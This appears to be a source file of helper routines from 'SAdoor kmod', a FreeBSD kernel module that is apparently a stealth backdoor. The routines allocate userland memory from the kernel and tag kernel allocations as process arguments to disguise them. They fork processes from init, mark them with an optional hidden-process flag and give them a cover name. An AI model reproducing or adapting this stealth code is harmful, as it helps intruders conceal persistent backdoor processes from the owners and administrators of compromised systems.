/*
 *  File: utils.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod common used routines
 *  Version: 1.0
 *  Date: Thu Jul  3 15:48:22 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 * 
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 * 
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */         

#include <sys/types.h>
#include <sys/systm.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/unistd.h>
#include <sys/sysproto.h>
#include <sys/mman.h>
#include <sys/malloc.h>
#include <sys/proc.h>
#include <sys/kthread.h>
#include <sys/select.h>
#include "sadoor.h"

/*
 * Allocates userland memory.
 *
 * Adds a munap_args "header" for uland_free() to use.
 */
void *
uland_calloc(size_t size)
{
    struct mmap_args margs;
    struct munmap_args *muargs;
    struct thread *td;
    int error;

    td = curthread;

    margs.addr = 0x00;
    margs.len = size + sizeof(struct munmap_args);
    margs.prot = PROT_READ|PROT_WRITE;
    margs.flags = MAP_ANON|MAP_PRIVATE;
    margs.fd = -1;
    margs.pad = 0x0;
    margs.pos = 0;

    if (size == 0) {
        log(1, "Error: uland_calloc(): Refusing to allocate zero bytes\n");
        return(NULL);
    }

    if ( (error = mmap(td, &margs))) {
        log(1, "Panic: mmap() failed: %d [exiting]\n", error);
        exit1(td, error);
    }
    
    muargs = (struct munmap_args *)(td->td_retval[0]);
    memset(muargs, 0x00, sizeof(struct munmap_args) + size);
    (void)suword(&muargs->addr, (int)muargs);
    (void)suword(&muargs->len, sizeof(struct munmap_args) + size);

    debug(3, "uland_calloc(): Returning address 0x%08x for block of %u bytes\n",
        (u_int)muargs, size + sizeof(struct munmap_args));

    return((void *)(muargs +1));
}

/*
 * Free userland memory allocated with uland_malloc()
 */
void
uland_free(void *upt)
{
    struct munmap_args *muargs;
    struct thread *td;
    u_int len;
    int error;

    if (upt == NULL) {
        log(1, "Error: uland_free(): Received NULL pointer\n");
        return;
    }

    td = curthread;
    muargs = (struct munmap_args *)upt -1;
    len = (u_int)fuword(&muargs->len);
    
    if ( (error = munmap(td, muargs))) {
        log(1, "Error: Failed to free memory: %d\n", error);
    }
    else {
        debug(3, "uland_free(): Free'd %u bytes\n", len);
    }
}

/*
 * Allocate kernel space memory as, ehrm, "process arguments"
 */
void *
kspace_calloc(size_t size)
{
    void *ptr;

    if ( (ptr = malloc(size, M_PARGS, M_ZERO|M_WAITOK)) == NULL) {
        log(1, "Panic: kspace_calloc(): malloc() failed [exiting]\n");
        kthread_exit(1);
    }

    return(ptr);
}

/*
 * Fork from init, returns 0 on success.
 */
int
fork_from_init(void (*function)(void *), void *arg)
{
    struct proc *uproc;
    struct thread *td;
    int error;
    int s;

    td = curthread;

    s = splhigh();
        if ( (error = fork1(FIRST_THREAD_IN_PROC(initproc), 
                RFNOWAIT | RFFDG | RFPROC, 0, &uproc))) {
            log(1, "Error: fork_from_init(): Can't fork: %d\n", error);
            splx(s);
            return(error);
        }

/*        uproc->p_flag |= P_SYSTEM; */
#ifdef SAKMOD_HIDE_PROCS
        uproc->p_flag |= SAKMOD_HIDDEN_PROC_FLAG;
#endif /* SAKMOD_HIDE_PROCS */

        uproc->p_args = NULL;
        
        cpu_set_fork_handler(FIRST_THREAD_IN_PROC(uproc), function, arg);
        snprintf(uproc->p_comm, MAXCOMLEN, "%s", SAKMOD_PROC_NAME);
        debug(2, "Forked from init, got pid %d\n", uproc->p_pid);
    splx(s);
    return(0);
}


/*
 * Write N bytes to a file descriptor,
 * wargs is assumed to be a userland address.
 */
ssize_t
writen(struct thread *td, struct write_args *wargs)
{
    size_t tot = 0;
    ssize_t n;
    u_char *pt;
    int error;

    n = fuword(&wargs->nbyte);
    pt = (u_char *)fuword(&wargs->buf);

    do {
        (void)suword(&wargs->buf, (int)(pt + tot));
        (void)suword(&wargs->nbyte, n - tot);

        if ( (error = write(td, wargs))) {
            log(1, "Error: writen(): %d\n", error);
            return(-1);
        }
        
        tot += td->td_retval[0];
    } while (tot < n);

    debug(3, "Wrote %d bytes\n", tot);
    return(tot);
}

/*
 * Read N bytes from a file descriptor,
 * rargs is assumed to be a userland address.
 */
ssize_t
readn(struct thread *td, struct read_args *rargs)
{
    ssize_t tot = 0;
    ssize_t n;
    u_char *pt;
    int error;

    n = fuword(&rargs->nbyte);
    pt = (u_char *)fuword(&rargs->buf);

    do {
        (void)suword(&rargs->buf, (int)(pt + tot));
        (void)suword(&rargs->nbyte, n - tot);
        
        if ( (error = read(td, rargs))) {
            log(1, "Error: readn(): %d\n", error);
            return(-1);
        }
        
        tot += td->td_retval[0];
    } while (tot < n);

    debug(3, "readn(): Read %d bytes\n", tot);
    return(tot);
}

/*  
 * Locate bytes in buffer.
 * Returns index to start of str in buf on success, 
 * -1 if string was not found.
 */ 
ssize_t
memstr(void *big, size_t blen, const void *little, size_t llen)
{
    ssize_t i = 0;
 
    if (blen < llen) 
        return(-1);
 
    while ( (blen - i) >= llen) {
        if (memcmp(((char *)big + i), little, llen) == 0)
            return(i); 
        i++;
    }
 
    return(-1); 
}

/*  
 * Returns 1 if file descriptor is ready for writing,
 * 0 otherwise.
 */ 
int 
ready_write(int fd)
{
    fd_set *writeset;
    struct select_args *slargs;
    struct timeval *tv;
    struct thread *td;
     int error = 0;

    td = curthread;
    writeset = (fd_set *)uland_calloc(sizeof(fd_set) + 
            sizeof(struct select_args) + 
            sizeof(struct timeval));
     slargs = (struct select_args *)(writeset +1);
    tv = (struct timeval *)(slargs +1);
 
    FD_ZERO(writeset);
    FD_SET(fd, writeset);

    (void)suword(&slargs->nd, fd+1);
    (void)suword(&slargs->in, NULL);
    (void)suword(&slargs->ou, (int)writeset);
    (void)suword(&slargs->ex, NULL);
    (void)suword(&slargs->tv, (int)tv);
    if ((error = select(td, slargs))) {
        log(1, "Error: ready_write(): select failed: %d\n", error);
        uland_free(writeset);
        return(0);
    }
    uland_free(writeset);
    return(td->td_retval[0] > 0 ? 1 : 0); 
}
